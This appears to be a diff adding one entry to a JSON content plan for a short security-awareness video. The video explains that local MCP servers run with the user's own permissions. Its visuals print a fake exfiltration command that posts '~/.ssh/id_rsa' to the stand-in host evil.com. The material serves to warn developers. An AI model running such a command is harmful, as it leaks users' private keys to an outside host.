@@ -13713,5 +13713,161 @@
         "id": "18026831522740843"
       }
     ]
+  },
+  {
+    "id": 121,
+    "style": "light",
+    "payoff": "The Model Context Protocol's own spec says a local MCP server runs with the same privileges as you, so one shell command dropped into it can read a file like your ssh key.",
+    "kicker": "Myth vs fact #30",
+    "hook": "That npm install isn't *boxed* in",
+    "hook_type": "problem",
+    "hook_visual": {
+      "type": "code",
+      "language": "json",
+      "title": "config.json",
+      "code": "\"command\": \"npx\",\n\"args\": [\"-y\", \"pkg\"]",
+      "highlight": [
+        1
+      ]
+    },
+    "alternatives": [
+      {
+        "hook": "Local MCP servers aren't *sandboxed*",
+        "spoken": "[fired up] Most developers think an MCP install runs safely, boxed, [confident and fast] like any npm package.",
+        "hook_type": "mistake"
+      },
+      {
+        "hook": "Looks installed, then *runs* as you",
+        "hook_type": "before_after",
+        "spoken": "[grinning, punchy] It installs like any package, (break) [serious] then it quietly runs with your own access."
+      },
+      {
+        "hook": "The *spec's* own warning example",
+        "hook_type": "test",
+        "spoken": "[fired up] The protocol's own spec gives a real example, [serious] of this exact attack happening."
+      }
+    ],
+    "points": [
+      {
+        "title": "Looks routine",
+        "body": "Added like any normal package",
+        "visual": [
+          {
+            "type": "code",
+            "language": "json",
+            "title": "config.json",
+            "code": "\"mcpServers\": {\n  \"files\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"pkg\"]\n  }\n}",
+            "highlight": [
+              3,
+              4
+            ]
+          }
+        ]
+      },
+      {
+        "title": "No real sandbox",
+        "body": "It runs with your own permissions",
+        "visual": [
+          {
+            "type": "screenshot",
+            "url": "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices",
+            "find": "same privileges as the client"
+          },
+          {
+            "type": "code",
+            "language": "md",
+            "title": "security_best_practices.md",
+            "code": "MCP servers run with the\nsame privileges as the client"
+          }
+        ]
+      },
+      {
+        "title": "The real risk",
+        "body": "One line can read your keys",
+        "visual": [
+          {
+            "type": "terminal",
+            "commands": [
+              "npx malicious-mcp-server",
+              "curl -d @~/.ssh/id_rsa evil.com"
+            ]
+          },
+          {
+            "type": "code",
+            "language": "bash",
+            "title": "attack.sh",
+            "code": "npx malicious-mcp-server\ncurl -d @~/.ssh/id_rsa evil.com",
+            "highlight": [
+              2
+            ]
+          }
+        ]
+      }
+    ],
+    "reveal": 3,
+    "cta": "Know a dev who *trusts* every install?",
+    "caption": "MCP server security in Claude Code and other AI tools\nThe protocol's own spec says local servers share your exact permissions\nKnow a developer who installs them without checking? 👇",
+    "hashtags": [
+      "#mcp",
+      "#claudecode",
+      "#devsecurity",
+      "#npm"
+    ],
+    "sources": [
+      "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices"
+    ],
+    "voiceover": [
+      "[urgent] That quick npm install runs with your exact permissions, [serious] no sandbox at all.",
+      "[knowing] You just paste one line into config.",
+      "[serious, fast] But the spec admits it runs as you.",
+      "[urgent] (break) [grinning, punchy] One shell line can read your ssh key.",
+      "[teasing] Send this to the dev who trusts every install."
+    ],
+    "test": {
+      "name": "topic",
+      "arm": "ai_tool"
+    },
+    "pillar": "relatable",
+    "series": "Myth vs fact",
+    "episode": 30,
+    "posted_at": "2026-11-24T18:25:50+00:00",
+    "media_id": "17912271273570387",
+    "review": {
+      "first_frame": {
+        "ok": true,
+        "problem": ""
+      },
+      "payoff": {
+        "ok": true,
+        "problem": ""
+      },
+      "scores": {
+        "hook": 8,
+        "phone_readability": 6,
+        "motion": 8,
+        "polish": 7
+      },
+      "metrics": {
+        "blank_frames": 0,
+        "first_blank_at": null,
+        "loop_seam": 12.6
+      }
+    },
+    "shown": [
+      "code",
+      "code",
+      "screenshot",
+      "code",
+      "text"
+    ],
+    "slot": 1,
+    "seconds": 19.0,
+    "youtube_id": "e78ax9uiZ3M",
+    "stories": [
+      {
+        "kind": "teaser",
+        "id": "18121256474066678"
+      }
+    ]
   }
 ]
